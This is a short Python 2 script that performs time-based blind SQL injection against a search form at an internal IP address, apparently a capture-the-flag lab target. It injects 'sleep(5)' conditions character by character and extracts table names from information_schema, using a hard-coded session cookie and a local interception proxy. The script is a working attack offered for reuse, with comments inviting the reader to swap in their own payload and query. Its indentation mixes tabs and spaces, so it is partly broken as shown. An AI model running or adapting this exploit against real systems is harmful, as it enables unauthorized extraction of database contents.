import requests
import sys
import time

def enum_sqli(inj_str):

	printable = 'abcdefghijklmnopqrstuvwxyz!_0' #can be change to add number
	for j in range (0, len(printable)):
 		# now we update the sqli
 		target = "http://10.129.71.26/admin"
 		proxies = {'http': 'http://127.0.0.1:8080'}
 		cookies = {'session':'.eJwljktqBDEMBe_idRa29bE0l2lsWY-EQALdM6uQu6chyypqUT_lwJnXe3k8z1e-leNjl0cJcSyplLrrUGJKAFsnD8JObSN6h-zVrQOGIUw-G4SHW5vBHtM55I6965oSjhmwqA5d3kJdexi3dE7elZlYRKMGt-q0erlHXlee_zftxrhOHM_vz_y6BRI-WmKFZI7uYyylnOC52YJMqkWI7fL7B0wVQE8.YLjZlQ.VsTQP4A8jqbDPZ9Hm72ZUSFQ9N0'}
 		test = inj_str.replace("[CHAR]", str(printable[j]))
 		data = {'search':str(test),'submit':'Search'}
 		start = time.time()
 		r = requests.post(target,data=data,cookies=cookies, proxies=proxies) #can be change for GET 
 		end = time.time()
 		delta = end - start
 		if (delta > 5):
 			return str(printable[j])
 	return None

def inject(r, inj):
	extracted = ""
	for i in range(1, r):
		
		injection_string = "n' or (select sleep(5) from dual where (SELECT SUBSTR(%s,%d,1)) = '[CHAR]');"  % (inj,i) #Change this with your own injection payload
 		retrieved_value = enum_sqli(injection_string)
 		if(retrieved_value):
 			extracted += retrieved_value
 			extracted_char = retrieved_value
 			sys.stdout.write(extracted_char)
 			sys.stdout.flush()
 		else:
 			print "\n(+) done!"
 			break
 	return extracted

def main():

	print "(+) Retrieving 1...."
	query = "(SELECT GROUP_CONCAT(table_name SEPARATOR '0') as test FROM information_schema.tables)" # Enum all tables change this with your query  
	version = inject(355, query)
	print "(+) table: %s " % (version)
	

if __name__ == "__main__":
	main()
